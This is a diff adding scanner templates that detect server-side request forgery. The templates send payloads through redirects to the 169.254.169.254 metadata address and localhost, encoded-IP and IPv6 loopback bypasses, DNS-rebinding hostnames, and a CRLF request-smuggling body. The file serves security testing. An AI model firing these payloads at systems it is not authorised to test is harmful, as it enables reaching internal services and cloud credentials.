@@ -1,0 +1,130 @@
+id: ssrf-redirect-follow
+info:
+  name: SSRF via Redirect Following
+  author: AniipID
+  severity: high
+  description: Detects SSRF by following redirects to internal hosts
+  tags: ssrf,redirect,internal
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?url=http://httpbin.org/redirect-to?url=http://169.254.169.254"
+      - "{{BaseURL}}?url=http://httpbin.org/redirect-to?url=http://127.0.0.1:22"
+    matchers:
+      - type: word
+        words:
+          - "169.254"
+          - "127.0.0.1"
+          - "OpenSSH"
+        condition: or
+        name: "ssrf-redirect-chain"
+---
+id: ssrf-ip-encoding
+info:
+  name: SSRF via IP Encoding
+  author: AniipID
+  severity: high
+  description: Detects SSRF using various IP address encoding bypass techniques
+  tags: ssrf,bypass,encoding
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?url=http://2130706433"
+      - "{{BaseURL}}?url=http://0x7f000001"
+      - "{{BaseURL}}?url=http://0177.0.0.1"
+      - "{{BaseURL}}?url=http://0x7f.0x0.0x0.0x1"
+      - "{{BaseURL}}?url=http://127.1"
+      - "{{BaseURL}}?url=http://0"
+    matchers:
+      - type: word
+        words:
+          - "127.0.0.1"
+          - "localhost"
+          - "2130706433"
+          - "0x7f"
+        condition: or
+        name: "ip-encoding-bypass"
+---
+id: ssrf-dns-rebinding
+info:
+  name: SSRF via DNS Rebinding
+  author: AniipID
+  severity: high
+  description: Detects SSRF using DNS rebinding services for internal access
+  tags: ssrf,dns,rebinding
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?url=http://1ed.4990ea2c.7f000001.rbndr.us"
+      - "{{BaseURL}}?url=http://7f000001.4990ea2c.1ed.rbndr.us"
+    matchers:
+      - type: word
+        words:
+          - "127.0.0.1"
+          - "169.254"
+        condition: or
+        name: "dns-rebinding"
+---
+id: ssrf-schema-bypass
+info:
+  name: SSRF Schema Bypass
+  author: AniipID
+  severity: medium
+  description: Detects SSRF using alternate URL schema variations
+  tags: ssrf,bypass,schema
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?url=http://127.0.0.1:80"
+      - "{{BaseURL}}?url=https://127.0.0.1:443"
+      - "{{BaseURL}}?url=HTTP://127.0.0.1"
+      - "{{BaseURL}}?url=HtTpS://127.0.0.1"
+    matchers:
+      - type: word
+        words:
+          - "127.0.0.1"
+        name: "schema-bypass"
+---
+id: ssrf-ipv6-bypass
+info:
+  name: SSRF via IPv6 Loopback
+  author: AniipID
+  severity: high
+  description: Detects SSRF using IPv6 loopback addresses for WAF bypass
+  tags: ssrf,ipv6,bypass
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?url=http://[::1]:80"
+      - "{{BaseURL}}?url=http://[0:0:0:0:0:0:0:1]"
+      - "{{BaseURL}}?url=http://[::ffff:127.0.0.1]"
+    matchers:
+      - type: word
+        words:
+          - "127.0.0.1"
+          - "localhost"
+        condition: or
+        name: "ipv6-bypass"
+---
+id: ssrf-http-request-smuggling
+info:
+  name: SSRF via HTTP Request Smuggling
+  author: AniipID
+  severity: critical
+  description: Detects SSRF that could lead to HTTP request smuggling
+  tags: ssrf,smuggling,http
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/proxy"
+    body: "url=http://127.0.0.1:80/api/admin HTTP/1.1\r\nHost: internal.com\r\n\r\n"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    matchers:
+      - type: word
+        words:
+          - "127.0.0.1"
+          - "admin"
+          - "internal"
+        condition: or
+        name: "ssrf-smuggling"
